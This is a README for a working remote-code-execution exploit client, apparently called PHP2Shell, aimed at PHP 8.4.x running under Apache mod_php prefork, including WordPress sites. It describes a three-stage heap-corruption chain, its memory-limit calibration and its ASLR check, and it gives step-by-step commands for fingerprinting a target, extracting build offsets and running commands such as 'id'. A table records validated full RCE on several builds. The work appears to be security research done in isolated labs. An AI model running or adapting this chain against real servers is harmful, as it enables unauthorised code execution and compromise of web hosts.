# Generic multi-build PHP2Shell client

This directory generalises the calibrated `exploit/exploit_off.py` chain to
other builds and topologies with minimal manual steps:

- `exploit_generic.py` — the full client: three-stage `display_errors=Off`
  chain, prefork worker parking, HTTP fingerprinting, memory_limit pad
  calibration, tolerant disclosure parsing and an early ASLR-draw check;
  the three validated builds are also shipped as built-in profiles
  (`--profile php-8.4.2{0,5,6}-amd64`) with their extraction provenance;
- `libphp_offsets.py` — build-offset extractor for any `libphp.so`
  (pure-Python ELF parser, never executes the target binary);
- `profiles/` — generated offset profiles for additional official builds.

## Validated matrix

| Target | Topology | Result |
| --- | --- | --- |
| `php:8.4.26-apache-bookworm` (pinned image) | 1 prefork worker, 8M | full RCE, `uid=33(www-data)` || `php:8.4.25-apache-bookworm` | 1 prefork worker, 8M | full RCE, 2/2 runs (auto-extracted offsets) |
| `php:8.4.20-apache-bookworm` | 1 prefork worker, 8M | full RCE (auto-extracted offsets) |
| WordPress 7.1.3 + SQLite on `php:8.4.26` | **4 prefork workers**, 8M | full RCE (keep-alive parking, 3/4 fenced) |
| WordPress 7.1.3 + SQLite on `php:8.4.25` | 1 prefork worker, 8M | full RCE (offsets auto-extracted) |
| WordPress 7.1.3 + SQLite on `php:8.4.20` | 1 prefork worker, 8M | full RCE (offsets auto-extracted) |
| `php:8.4.26-apache-bookworm` | 1 worker, **memory_limit=32M** | phase 1 complete (4000-byte heap disclosure via auto-calibrated pads); phases 2-3 remain 8M-geometry-bound |

Receipts: `../artifacts/generic-multi-build-20261023/`, including terminal
screenshots of the command execution on every validated target. All runs
use offsets extracted by `libphp_offsets.py` — for 8.4.26 the extracted
values are identical to the original hand calibration, verified with
`--validate-8426`. All targets were local and network-isolated
(loopback only).

Key finding: the calibrated heap geometry carries across the whole official
`php:8.4.x-apache-bookworm` series tested (8.4.20 → 8.4.26); only the five
terminal offsets change, and they are extracted automatically. Running the
chain against 8.4.25 or 8.4.20 therefore requires nothing but the generated
profile.

## Usage

Start a target with the usual lab scripts, then:

```sh
# 1. fingerprint the target
python3 generic/exploit_generic.py --url http://127.0.0.1:9090/index.php \
  --host-header 127.0.0.1:8088 --fingerprint

# 2. validated builds (8.4.20 / 8.4.25 / 8.4.26): built-in profiles, no file needed
python3 generic/exploit_generic.py --url http://127.0.0.1:9090/index.php \
  --host-header 127.0.0.1:8088 --profile php-8.4.25-amd64 --cmd id -vv

# 3. any other official build: extract offsets, then pass the profile file
docker create --name tmp php:8.4.25-apache-bookworm
docker cp tmp:/usr/lib/apache2/modules/libphp.so ./libphp.so
docker rm tmp
python3 generic/libphp_offsets.py ./libphp.so --php-version 8.4.25 \
  > generic/profiles/php-8.4.25-amd64.json
python3 generic/exploit_generic.py --url http://127.0.0.1:9090/index.php \
  --host-header 127.0.0.1:8088 --profile-json generic/profiles/php-8.4.25-amd64.json \
  --cmd id -vv

# unknown memory_limit: search and calibrate automatically (~20-40 minutes)
python3 generic/exploit_generic.py --url ... --memory-limit auto --cmd id

# known pad calibration: replay quickly
python3 generic/exploit_generic.py --url ... --memory-limit 32 \
  --set off_a_pad_count=2 --set off_a_mid_pad_count=21 \
  --set off_a_fine_pad_count=31 --set off_a_x_extra_count=96 \
  --set off_a_x2_extra_count=1 --cmd id
```

`libphp_offsets.py --validate-8426` asserts the known offsets of the pinned
8.4.26 image; it was used to validate the extractor itself.

## memory_limit calibration (phase 1 at any limit)

The calibrated shape targets 8M. For a larger limit the client inserts a pad
ladder between `PHP_SESSION_UPLOAD_PROGRESS` and the file part, pushing the
OOM into the ~600-byte stale-state window between the random session-id
creation (`php_session_initialize`) and the `Set-Cookie` header add. Every
POST value costs about three times its size in limit terms (rfc1867 raw
buffer + ext/filter copy + `$_POST` copy), so the ladder is:

1. 4 MiB fields — huge mmap-backed allocations, outside the 2 MiB Zend MM
   chunks (so they do not pollute the page lists the phase-1 forge reclaims);
2. 128 KiB fields — in-chunk, holes too small for the 256-page forge;
3. 4 KiB fields — page-aligned copies;
4. 231-byte fields — X-shaped, bin-256 copies (outside the bin-64 that
   places `PS(id)`);
5. 100-byte fields — bin-128 copies, ~400 bytes of usage each;
6. 20-byte fields — bin-48 copies, ~150 bytes of usage each.

The tuner runs nested binary searches on the A-response classification
(200 / 500+Set-Cookie / 500 without Set-Cookie) and verifies every
500-no-cookie landing against the real phase-1 leak (cookie >= 512 bytes).
On the 32M validation target it converged to
`coarse=2 mid=21 fineN=31 xextra=96 x2=1` in 131 probes.

Phase 2 at a non-8M limit is work in progress: the page-based `900002` forge
lands deterministically (the bin-256 mirror added to `libphp_b` fixed the
drift), but the final live-HashTable placement needs the A-side OOM to leave
the bin-64 identity of `PS(id)` rather than the page identity; the
experimental knobs (`libphp_b_pre_bin64_n`, `libphp_b_extra_arrays`,
`off_a_x3_extra_count`) are in place for the next calibration pass.

## ASLR draw check

After the heap disclosure the client checks byte 4 of `main_heap` against
the `0x40` bit (aliased to `IS_STR_PERMANENT` by the phase-2 freelist
forge on this layout) and warns early on an unfavourable draw. Verified
experimentally: an unfavourable draw fails phase 2 exactly as predicted; a
master restart draws a new mapping. The check is reported as
`aslr_draw_favourable` in `result.json`.

## Limitations

- Phases 2-3 are calibrated for the 8M heap shape; at other limits phase 1
  works, phases 2-3 need the recalibration described above.
- Non-official builds (distro packages) change both the offsets (solvable
  via the extractor) and potentially the heap geometry (needs recalibration).
- Apache mod_php prefork only: FPM/CGI terminate the process after a
  request-startup failure, so no cross-request state survives.
- `post_max_size` must exceed `memory_limit` by a comfortable margin, or
  the body is rejected before any OOM can occur (this excludes most default
  production configs such as 128M/8M).
- The phase-2 freelist forge requires the favourable ASLR draw described
  above.
- amd64 only; arm64 porting is future work.
